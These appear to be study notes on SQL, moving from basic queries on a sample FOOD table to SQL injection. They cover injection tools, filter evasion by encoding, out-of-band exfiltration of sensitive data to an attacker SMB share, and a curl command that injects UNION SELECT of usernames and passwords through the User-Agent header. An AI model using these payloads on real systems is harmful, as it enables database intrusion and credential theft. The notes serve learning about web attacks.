**Commands**

SHOW TABLES;

-            FOOD
------------------------------------
NAME       | TYPE       | COLOUR
-------------------------------------
Bread      | Carbs      | Brown
Rice       | Carbs      | White
Chicken    | Meat       | White
Beef       | Meat       | Red
Salmon     | Fish       | Pink
Tuna       | Fish       | Red
Broccoli   | Vegetable  | Green
Apple      | Fruit      | Red
Milk       | Dairy      | White

-- View all data
SELECT * FROM FOOD;

-- Select specific columns
SELECT NAME, TYPE FROM FOOD;

-- Update a row
UPDATE FOOD SET COLOUR = 'Light Brown' WHERE NAME = 'Bread';

-- Filter by type
SELECT * FROM FOOD WHERE TYPE = 'Meat';

-- Delete a row
DELETE FROM FOOD WHERE NAME = 'Tuna';

**Notes**

Anything after -- on the same line is ignored by the database.

```https://gchq.github.io/CyberChef/``` to encode URLS

Common/Default SQL database ports
*  MySQL / MariaDB 3306
*  PostgreSQL 5432
*  Microsoft SQL Server (MSSQL) 1433 or 1434
*  Oracle Database 1521

SQL tools
*  SQLMAP
*  SQLNINJA
*  JSQL INJECTION
*  BBQSQL


## Filter Evasion Techniques

*  **URL Encoding** - Common encoding method where characters are represetned using **%** followed by their ASCII value. ```' OR 1=1--``` -> ```%27%20OR%201%3D1--```

*  **Hexadecimal Encoding** - ```SELECT * FROM users WHERE name = 'admin'``` -> ```SELECT * FROM users WHERE name = 0x61646d696e```  

*  **Unicode Encoding** -  ```admin``` -> ```\u0061\u0064\u006d\u0069\u006e``` Bypass filters that only check for specific ASCII characters.


## Out of band injection
Sends SQL messages to a external source, for a example a python server.

Internal:
*  ```SELECT sensitive_data INTO OUTFILE '\\\\[IP ADDRESS]\\logs\\out.txt';```

External:
*  ```python3.9 smbserver.py -smb2support -comment "My Logs Server" -debug logs /tmp```
*  ```smbclient //[IP ADDRESS]/logs -U guest -N``` -> access the contents of the network share

## HTTP Header Injection
If SQL queries are on the server side and are not sanitised it may lead to SQL onto HTTP headers such as **User-Agent, Referer, or X-Forwarded-For**

```curl -H "User-Agent: ' UNION SELECT username, password FROM user; # "http://WEBSITE.COM```
